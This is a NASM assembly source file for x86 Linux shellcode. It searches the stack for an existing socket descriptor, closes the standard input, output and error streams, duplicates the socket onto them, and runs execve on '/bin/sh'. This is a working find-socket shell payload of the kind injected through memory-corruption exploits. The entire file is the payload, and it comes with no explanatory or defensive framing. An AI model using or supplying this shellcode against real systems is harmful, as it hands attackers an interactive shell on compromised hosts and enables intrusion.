%include "syscalls.inc"

%define LCPTR_FD_OFFSET (2 * 12) + (4 * 4) + (6 * 4)
                
                section data

shellcode:      ; find the fd                
                mov     esi, esp
.check_lp:      lodsd
                mov     ebx, [esi]
                ror     eax, 0x10
                test    ax, ax
                jnz     .check_lp
                rol     eax, 0x10
                rol     ebx, 0x08
                cmp     bl, 0x40
                jne     .check_lp
                ror     ebx, 0x08
                cmp     eax, [ebx + LCPTR_FD_OFFSET]
                jne     .check_lp
                cmp     eax, [ebx + LCPTR_FD_OFFSET + 4]
                jne     .check_lp
                cmp     dword [ebx + LCPTR_FD_OFFSET + 8], -1
                jne     .check_lp
                cmp     dword [ebx + LCPTR_FD_OFFSET + 12], -1
                jne     .check_lp
                
                xchg    eax, edx
                
                ; close stdin
                xor     eax, eax
                mov     al, __NR_close
                push    eax
                push    eax
                xor     ebx, ebx
                cmp     ebx, edx
                jz      .skip0
                int     0x80
.skip0:         pop     eax
                inc     ebx
                cmp     ebx, edx
                jz      .skip1
                int     0x80
.skip1:         pop     eax
                inc     ebx
                cmp     ebx, edx
                jz      .skip2
                int     0x80
.skip2:         xchg    edx, ebx
                
                ; dup the fds
                xor     eax, eax
                mov     al, __NR_dup
                push    eax
                push    eax
                int     0x80
                pop     eax
                int     0x80
                pop     eax
                int     0x80                

                ; execute the shell
                jmp     .backcall
.execve:        pop	ebx                          ; get delta
                xor     eax, eax                     ; clear eax
                mov     [ebx+.null-.shell], al       ; null-terminate /bin/sh string
                lea     ecx, [ebx+.argv0-.shell]
                mov     [ecx], ebx
                lea     edx, [ecx+0x04]
                mov     [edx], eax
                mov     al, __NR_execve
                int     0x80

                xor     eax, eax
                mov     ebx, eax
                inc     eax
                int     0x80
                
.backcall:	call	.execve                     ; call back to get delta
.shell:		db	'/bin/sh'
.null:          db      0
.argv0:         dd      0
.argv1:         dd      0
